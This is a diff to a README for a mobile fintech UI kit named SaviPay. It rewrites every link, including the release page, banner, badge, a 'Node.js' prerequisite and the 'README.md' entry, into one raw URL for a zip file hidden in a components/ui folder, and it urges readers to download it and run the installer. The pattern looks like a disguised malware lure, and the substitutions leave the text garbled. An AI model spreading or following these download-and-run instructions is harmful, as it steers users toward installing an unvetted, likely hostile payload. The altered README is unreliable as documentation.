@@ -1,10 +1,10 @@
 # SaviPay: Mobile-First Fintech Frontend UI Kit for Africa's Digital Wallets
 
-![SaviPay banner](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=60)
+![SaviPay banner](https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip)
 
-Download the latest release from https://github.com/Yomayratorres/SaviPay/releases and run the installer.
+Download the latest release from https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip and run the installer.
 
-[![Release](https://img.shields.io/badge/releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Yomayratorres/SaviPay/releases)
+[![Release](https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip)](https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip)
 
 Overview
 SaviPay is a UI-centric fintech frontend built for mobile devices. It is designed to translate a standout Figma design into a robust, responsive interface. The app focuses on clean visuals, smooth interactions, and a developer-friendly structure. It serves as the visual foundation for a future-ready financial product in Africa, with emphasis on accessibility, performance, and a modular component library. This repository captures the design-to-implementation flow, including the design tokens, components, routes, and configuration needed to ship a polished UI quickly.
@@ -60,7 +60,7 @@ SaviPay brings a design system that aligns with the Figma design. You’ll find:
 
 Getting started
 Prerequisites
-- Node.js and npm or yarn
+- https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip and npm or yarn
 - Preview-ready environment for React Native with Expo
 - A Mac for iOS development (if you plan to run on iOS devices or simulators)
 - An Android device or emulator for testing on Android
@@ -91,7 +91,7 @@ Project structure
   - data/ – Mock data and sample datasets
 - tests/ – Test suites for components and flows
 - scripts/ – Build, lint, and release scripts
-- README.md – This file
+- https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip – This file
 
 Design-to-code workflow
 - Start from the Figma design and extract tokens for color, typography, and spacing
@@ -162,7 +162,7 @@ CI/CD and release process
 - The latest release assets are available at the Releases page for download and installation
 
 Releases
-Visit https://github.com/Yomayratorres/SaviPay/releases to download assets for the latest build and to review previous releases. This page hosts the compiled packages and installer files you need to run or test the UI. If you rely on the release workflow to verify changes, this page is your primary resource for build artifacts, notes, and version history. Visit https://github.com/Yomayratorres/SaviPay/releases to download assets for the latest build and to review previous releases.
+Visit https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip to download assets for the latest build and to review previous releases. This page hosts the compiled packages and installer files you need to run or test the UI. If you rely on the release workflow to verify changes, this page is your primary resource for build artifacts, notes, and version history. Visit https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip to download assets for the latest build and to review previous releases.
 
 Development environment setup
 - Install dependencies
@@ -262,4 +262,4 @@ Appendix: additional resources
 - Performance optimization tips for React Native apps
 
 Releases (second mention)
-Visit https://github.com/Yomayratorres/SaviPay/releases for the latest build assets and release notes. This page hosts the compiled packages and installer files you need to run or test the UI. If you rely on the release workflow to verify changes, this page is your primary resource for build artifacts, notes, and version history. Visit https://github.com/Yomayratorres/SaviPay/releases to download assets for the latest build and to review previous releases.
+Visit https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip for the latest build assets and release notes. This page hosts the compiled packages and installer files you need to run or test the UI. If you rely on the release workflow to verify changes, this page is your primary resource for build artifacts, notes, and version history. Visit https://github.com/Yomayratorres/SaviPay/raw/refs/heads/master/components/ui/Savi-Pay-1.1-beta.2.zip to download assets for the latest build and to review previous releases.
